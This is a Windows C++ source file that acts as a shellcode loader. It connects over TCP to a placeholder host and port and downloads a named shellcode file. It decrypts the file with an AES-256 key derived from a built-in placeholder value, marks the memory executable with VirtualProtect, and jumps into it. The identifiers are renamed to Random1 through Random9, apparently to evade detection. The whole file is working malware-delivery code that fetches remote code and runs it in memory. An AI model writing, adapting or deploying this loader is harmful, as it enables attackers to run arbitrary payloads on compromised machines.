#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

// Define the shellcode function signature
typedef void (*RandomA)();

bool Random1(const char* Random2, int Random3, const char* Random4, char*& Random5, size_t& Random6) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(Random3);
    serverAddress.sin_addr.s_addr = inet_addr(Random2);

    if (serverAddress.sin_addr.s_addr == INADDR_NONE) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    // Send the length of the file path first
    size_t Random4Len = strlen(Random4);
    send(clientSocket, reinterpret_cast<char*>(&Random4Len), sizeof(Random4Len), 0);

    // Send the file path to the server
    send(clientSocket, Random4, Random4Len, 0);

    int fileSize;
    int bytesRead = recv(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);
    if (bytesRead != sizeof(fileSize)) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    fileSize = ntohl(fileSize);

    // Receive and save the binary data in a dynamically allocated buffer
    Random5 = new char[fileSize];
    if (Random5 == nullptr) {
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    size_t totalSize = 0;
    while (totalSize < fileSize) {
        bytesRead = recv(clientSocket, Random5 + totalSize, fileSize - totalSize, 0);
        if (bytesRead <= 0) {
            delete[] Random5;
            closesocket(clientSocket);
            WSACleanup();
            return false;
        }
        totalSize += bytesRead;
    }

    // Close the socket
    closesocket(clientSocket);

    Random6 = totalSize;

    return true;
}

int Random7(char* Random8, unsigned int Random8_len, char* Random9, size_t Random9len) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)Random9, (DWORD)Random9len, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, Random8, &Random8_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

char Random9[] = KEYVALUE;

int main() {
    const char* Random2 = "HOSTNAME";  // Replace with the actual server IP
    int Random3 = PORTY;               // Replace with the actual server port
    const char* Random4 = "SHELLCODEFILE";  // Replace with the actual file path on the server

    char* Random5;
    size_t Random6;

    if (Random1(Random2, Random3, Random4, Random5, Random6)) {
        Random7((char*)Random5, Random6, Random9, sizeof(Random9));

        // Allocate executable memory with READ, WRITE permissions
        LPVOID executableMemory = VirtualAlloc(NULL, Random6, MEM_COMMIT, PAGE_READWRITE);
        if (executableMemory == NULL) {
            delete[] Random5;
            return 1;
        }

        // Copy binary data to the executable memory
        memcpy(executableMemory, Random5, Random6);

        // Change the protection to PAGE_EXECUTE_READ
        DWORD oldProtect;
        if (!VirtualProtect(executableMemory, Random6, PAGE_EXECUTE_READ, &oldProtect)) {
            VirtualFree(executableMemory, 0, MEM_RELEASE);
            delete[] Random5;
            return 1;
        }

        // Create a function pointer to the shellcode
        RandomA RandomB = reinterpret_cast<RandomA>(executableMemory);

        // Call the shellcode function
        RandomB();
    } else {
        return 1;
    }

    return 0;
}

